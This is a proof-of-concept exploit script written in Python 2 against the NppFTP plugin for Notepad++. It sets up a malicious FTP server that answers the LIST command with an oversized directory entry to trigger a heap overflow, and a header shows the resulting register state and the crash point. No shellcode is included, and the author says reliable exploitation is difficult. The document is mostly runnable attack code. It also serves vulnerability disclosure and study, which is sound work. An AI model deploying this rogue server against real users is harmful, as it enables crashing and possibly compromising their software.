# Notepad++ NppFTP plugin LIST command Remote Heap Overflow PoC
# Date:  17.08.2011
# Author: 0in (Maksymilian Motyl)
# Mail: 0in [dot] email /at\ gmail \dot/ com
# Software Link: http://notepad-plus-plus.org/
# Vulnerable plugin: http://sourceforge.net/projects/nppftp/
# Version: Tested on nppftp 0.2.3.0 and 0.2.4.0 (newest)
# Debug:
# EAX 42414141
# ECX 00000ED6
# EDX 024FD99C ASCII "AAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAABAAA"
# EBX 42414141
# ESP 000E0F48
# EBP 000E0F70
# ESI 024FD100
# EDI 024FD100
# EIP 6A14D2D7 NppFTP.6A14D2D7
 
# 6A14D2D7   8B03             MOV EAX,DWORD PTR DS:[EBX]
# 6A14D2D9   891C24           MOV DWORD PTR SS:[ESP],EBX
# 6A14D2DC   FF50 2C          CALL DWORD PTR DS:[EAX+2C] <- BOOM
 
# Theoretically its exploitable, but we haven't much available memory to work with, and
# all memory is dynamicly located, so all addresses are not static..
 
 
import socket
import os
class ftp_server:
 
    def __init__(self):
 
        self.host = '0.0.0.0'
        self.passive_port = 2531
 
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('', 21))
        self.sock.listen(1)
 
        a = self.passive_port/256
        b = self.passive_port%256
        self.tuple_port = (a, b)
        self.host_join = ','.join(self.host.split('.'))
        self.passive = False
 
 
    def get(self):
        return self.conn.recv(1024).replace('\r', '').replace('\n', '')
 
    def getcwd(self):
       # return shellcode
        return "passwords"
 
    def put(self, ftr):
        x = {
 
            150:" Data connection accepted from %s:%s; transfer starting."%(self.host, self.passive_port),
            200:" Type okay.",
            220:" Server ready.",
            226:" Listing completed.",
            227:" Entering Passive Mode (%s,%s,%s)"%(self.addr_join, self.tuple_port[0], self.tuple_port[1]),
            230:" User logged in, proceed.",
            250:' "/%s" is new cwd.'%self.getcwd(),
            257:' "/%s" is cwd.'%self.getcwd(),
            331:" User name okay, need password.",
            502:" Command not implemented.",
            551:" Requested action aborted. Page type unknown."
             
                   }[ftr]
 
        s = '%s%s\r\n'%(ftr, x)
        self.conn.send(s)
        return s
    
    def main(self):
        self.conn, self.addr = self.sock.accept ()
        self.addr_join = ','.join(self.addr[0].split('.'))
         
        self.put(220)
 
        while 1:
            try:
                data = self.get().upper()
            except socket.error:
                self.conn.close()
                self.sock.shutdown(socket.SHUT_RDWR)
                if self.passive:
                    self.conn2.close()
                    self.sock2.shutdown(socket.SHUT_RDWR)                   
                raise socket.error
                 
 
            if data[:4] == 'USER':   s = 331
            elif data[:4] == 'PASS': s = 230
            elif data[:3] == 'PWD':  s = 257
            elif data[:4] == 'TYPE':
                s = 200
            elif data[:4] == 'PASV':
                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.bind((self.addr[0], self.passive_port))
                self.sock2.listen(1)
                s = self.put(227)
 
                self.conn2, addr = self.sock2.accept()
                self.passive = True
                s = 0
       
            elif data[:3] == 'CWD':
                try:
                    s = 250
                except OSError:
                    s = 551
            elif data[:4] == 'LIST':
                print "LIST..."
                s = self.put(150)
 
                s = self.passive_do(1)
 
                s = self.put(226)
 
 
                s = 0
            else:
                s = 502
     
            if s:
                s = self.put(s)
 
    def passive_do(self, id):
        print "Sending exploit.."
 
        exploit="\x42\x41\x41\x41"*22+"\x42\x41\x41\x41"*53+"C"*400+"D"*4000+"E"*1019+"F"*2000
        res = "drwxrwxrwx 5 ftpuser ftpuser 512 Jul 26 "+exploit+" "+"\x95"*18555+"\r\n"
        self.conn2.send(res)
        self.conn2.send('\r\n')
        self.conn2.close()
        return res
 
 
print "Notepad++ NppFTP plugin LIST command Remote Heap Overflow PoC by 0in"       
while 1:
    try:
        print "Waiting for target.."
        ftp_server().main()
    except socket.error:
        print "Rebooting server...\n"
